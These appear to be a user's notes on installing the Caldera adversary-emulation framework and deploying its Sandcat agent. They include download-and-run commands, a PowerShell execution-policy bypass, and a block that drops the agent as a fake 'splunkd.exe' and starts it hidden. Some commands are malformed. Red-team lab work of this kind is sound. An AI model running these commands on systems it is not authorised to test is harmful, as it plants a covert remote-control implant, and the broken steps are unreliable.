# Install Caldera on Kali Linux



```
sudo update --fix-missing -y
sudo apt install caldera
caldera --insecure --build
https://localhost:8888
red / admin

```

### Run Caldear

```
caldera --insecure --build
https://localhost:8888    red / admin
```


### Create an agent (Sandcat)

In Caldera UI:
Agents → Deploy Agent → Sandcat
Linux one-liner example:

```
curl -sk https://localhost:8888/file/download -H "file:sandcat.go" -o sandcat.go
go build sandcat.go
./sandcat -server https://YOUR_CALDERA_IP:8888 -group red

```

### Install agent on Windows

Go to Agents → Deploy Agent

Select:

Agent: Sandcat

Platform: windows

Architecture: amd64

Copy the provided download command or URL

sandcat.exe -server https://SERVER_IP:8888 -group red
https://SERVER_IP:8888/file/download?sandcat.go

```
cd ~/caldera5/plugins/sandcat
GOOS=windows GOARCH=amd64 go build -o sandcat.exe

```

```
Set-ExecutionPolicy Bypass -Scope Process -Force
Unblock-File .\sandcat.exe

Invoke-WebRequest -Uri https://SERVER_IP:8888/file/download -Headers @{"file"="sandcat.exe"} -OutFile sandcat.exe; .\sandcat.exe -server https://SERVER_IP:8888 -group red


```


Correct steps to build a Windows agent

Go to the Go agent folder:

cd ~/caldera5/plugins/sandcat/gocat


Initialize Go module (needed once):

go mod tidy


Build the Windows agent:

GOOS=windows GOARCH=amd64 go build -o sandcat.exe main.go


main.go is the entry point for the Sandcat agent.

For Linux: GOOS=linux GOARCH=amd64 go build -o sandcat_linux main.go

Optional: compress the EXE:

upx -9 sandcat.exe

Deploy the agent to Windows

Copy the sandcat.exe to the target machine and run:

.\sandcat.exe -server https://<CALDERA_SERVER_IP>:8888 -group red


Replace <CALDERA_SERVER_IP> with your server IP.

The agent should appear in Agents → Windows in the CALDERA UI.


```
Test-NetConnection 192.168.1.47 -Port 8888

$server="http://192.168.1.47:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;

```
